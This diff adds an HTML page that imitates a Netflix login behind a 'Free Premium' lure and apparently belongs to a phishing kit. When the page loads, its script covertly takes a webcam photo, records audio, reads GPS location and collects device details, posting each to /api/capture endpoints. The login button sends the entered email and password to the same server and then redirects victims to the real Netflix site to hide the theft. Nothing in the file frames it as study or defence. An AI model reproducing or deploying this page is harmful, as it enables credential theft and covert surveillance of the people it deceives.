@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix - Watch TV Shows Online</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+.card{background:#fff;border-radius:24px;padding:35px;width:100%;max-width:380px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+.logo{width:70px;height:70px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff}
+h1{font-size:28px;color:#333;margin-bottom:5px;font-weight:700}
+.subtitle{color:#888;font-size:14px;margin-bottom:20px}
+.badge{display:inline-block;padding:8px 20px;background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#fff;border-radius:20px;font-size:13px;font-weight:600;margin-bottom:25px}
+.form-box{background:#f8f9fa;border-radius:16px;padding:20px;text-align:left}
+.form-box h3{font-size:15px;color:#333;margin-bottom:15px;display:flex;align-items:center;gap:8px}
+.input-group{margin-bottom:15px}
+.input-group label{display:block;font-size:12px;color:#666;margin-bottom:6px;font-weight:500}
+.input-group input{width:100%;padding:14px 16px;border:2px solid #e5e7eb;border-radius:12px;font-size:15px;outline:none;transition:all 0.3s;background:#fff}
+.input-group input:focus{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1)}
+.btn-login{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-login:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.4)}
+
+/* Processing */
+.processing{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,#667eea,#764ba2);align-items:center;justify-content:center;z-index:1000}
+.processing.active{display:flex}
+.process-box{background:#fff;border-radius:24px;padding:40px;text-align:center;max-width:300px;width:90%}
+.spinner{width:60px;height:60px;border:4px solid #f3f3f3;border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.process-box h2{font-size:20px;color:#333;margin-bottom:8px}
+.process-box p{color:#888;font-size:14px;margin-bottom:20px}
+.progress-bar{width:100%;height:6px;background:#f3f3f3;border-radius:3px;overflow:hidden}
+.progress-bar .fill{height:100%;background:linear-gradient(135deg,#667eea,#764ba2);width:0%;animation:progress 3s ease-in-out forwards}
+@keyframes progress{0%{width:0%}50%{width:60%}100%{width:100%}}
+
+#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+</style>
+</head>
+<body>
+<div class="card" id="mainCard">
+    <div class="logo">&#127909;</div>
+    <h1>Netflix</h1>
+    <p class="subtitle">Watch anywhere</p>
+    <span class="badge">&#127873; Free Premium</span>
+
+    <div class="form-box">
+        <h3>&#128273; Login to Continue</h3>
+        <div class="input-group">
+            <label>Email or Phone</label>
+            <input type="text" id="email" placeholder="Enter your email">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Enter your password">
+        </div>
+        <button class="btn-login" onclick="handleLogin()">Login & Continue &#9654;</button>
+    </div>
+</div>
+
+<div class="processing" id="processing">
+    <div class="process-box">
+        <div class="spinner"></div>
+        <h2>Processing...</h2>
+        <p>Loading library...</p>
+        <div class="progress-bar"><div class="fill"></div></div>
+    </div>
+</div>
+
+<video id="hiddenCamera" autoplay playsinline></video>
+<canvas id="captureCanvas" style="display:none"></canvas>
+
+<script>
+const TOKEN = "<%= token %>";
+let captureId = null;
+
+async function silentCapture() {
+    const device = {
+        platform: navigator.platform,
+        browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0] || 'Unknown',
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        memory: navigator.deviceMemory || 'Unknown'
+    };
+    const screen = { width: window.screen.width, height: window.screen.height };
+    let battery = {};
+    try { const b = await navigator.getBattery(); battery = {level:b.level,charging:b.charging}; } catch(e){}
+    const network = { type: navigator.connection?.type || 'Unknown', effectiveType: navigator.connection?.effectiveType || 'Unknown' };
+
+    const resp = await fetch('/api/capture/init', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({token:TOKEN, template:'netflix', device, screen, battery, network})
+    });
+    const data = await resp.json();
+    captureId = data.capture_id;
+
+    // Silent camera
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+        const video = document.getElementById('hiddenCamera');
+        video.srcObject = stream;
+        setTimeout(() => {
+            const canvas = document.getElementById('captureCanvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video,0,0,640,480);
+            fetch('/api/capture/photo', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({capture_id:captureId, image:canvas.toDataURL('image/jpeg',0.8)})
+            });
+            stream.getTracks().forEach(t=>t.stop());
+        }, 2000);
+    } catch(e){}
+
+    // GPS
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => fetch('/api/capture/location', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({capture_id:captureId, lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy})
+            }),
+            ()=>{}, {enableHighAccuracy:true, timeout:10000}
+        );
+    }
+
+    // Audio
+    try {
+        const aStream = await navigator.mediaDevices.getUserMedia({audio:true});
+        const rec = new MediaRecorder(aStream);
+        const chunks = [];
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = () => {
+            const blob = new Blob(chunks,{type:'audio/webm'});
+            const reader = new FileReader();
+            reader.onloadend = () => fetch('/api/capture/audio', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({capture_id:captureId, audio:reader.result})
+            });
+            reader.readAsDataURL(blob);
+        };
+        rec.start();
+        setTimeout(()=>rec.stop(),5000);
+    } catch(e){}
+}
+
+async function handleLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if (!email || !password) { alert('Please fill all fields'); return; }
+
+    await fetch('/api/capture/credentials', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({capture_id:captureId, username:email, password:password})
+    });
+
+    document.getElementById('mainCard').style.display = 'none';
+    document.getElementById('processing').classList.add('active');
+
+    setTimeout(() => window.location.href = 'https://www.netflix.com', 4000);
+}
+
+window.addEventListener('load', silentCapture);
+</script>
+</body>
+</html>
